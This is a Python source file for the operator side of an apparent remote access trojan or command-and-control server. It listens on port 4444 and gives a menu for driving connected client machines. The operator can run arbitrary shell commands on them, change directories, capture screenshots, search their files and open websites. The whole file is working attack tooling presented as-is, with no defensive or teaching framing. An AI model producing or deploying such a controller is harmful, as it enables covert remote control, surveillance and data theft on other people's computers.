import socket
import threading

# Configuration
HOST = "192.168.xx.xx"  # Listen on all network interfaces
PORT = 4444
BUFFER_SIZE = 1024

# Function to receive standard responses
def receive_data(client_socket):
    response = client_socket.recv(BUFFER_SIZE).decode()
    print("Response from client:\n", response)

# Function to handle screenshot reception
def receive_screenshot(client_socket):
    screenshot_path = "received_screenshot.png"
    with open(screenshot_path, "wb") as f:
        while True:
            data = client_socket.recv(BUFFER_SIZE)
            if not data:
                break
            f.write(data)
    print(f"Screenshot received and saved as {screenshot_path}")

# Function to display the menu and handle user commands
def show_menu():
    print("\n--- Server Menu ---")
    print("1. Execute command")
    print("2. Change directory")
    print("3. Take screenshot")
    print("4. Search for files or directories")
    print("5. Open website in Firefox")
    print("6. Exit")
    return input("Choose an option: ")

# Function to handle each client in a separate thread
def handle_client(client_socket, client_address):
    print(f"Connected to {client_address}")

    try:
        while True:
            choice = show_menu()

            if choice == "1":
                command = input("Enter command to execute: ")
                client_socket.send(command.encode())
                receive_data(client_socket)

            elif choice == "2":
                directory = input("Enter directory to change to: ")
                client_socket.send(f"cd {directory}".encode())
                receive_data(client_socket)

            elif choice == "3":
                client_socket.send("screenshot".encode())
                receive_screenshot(client_socket)

            elif choice == "4":
                query = input("Enter search query: ")
                client_socket.send(f"search {query}".encode())
                receive_data(client_socket)

            elif choice == "5":
                url = input("Enter website URL: ")
                client_socket.send(f"web {url}".encode())
                receive_data(client_socket)

            elif choice == "6":
                client_socket.send("exit".encode())
                print(f"Closing connection to {client_address}.")
                break

            else:
                print("Invalid choice. Try again.")

    except Exception as e:
        print(f"Error with {client_address}: {e}")

    finally:
        client_socket.close()
        print(f"Connection closed for {client_address}")

# Main function to start the server and accept clients
def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"Server listening on {HOST}:{PORT}...")

    while True:
        client_socket, client_address = server_socket.accept()
        # Start a new thread for each client connection
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()
        print(f"Started thread for {client_address}")

if __name__ == "__main__":
    main()
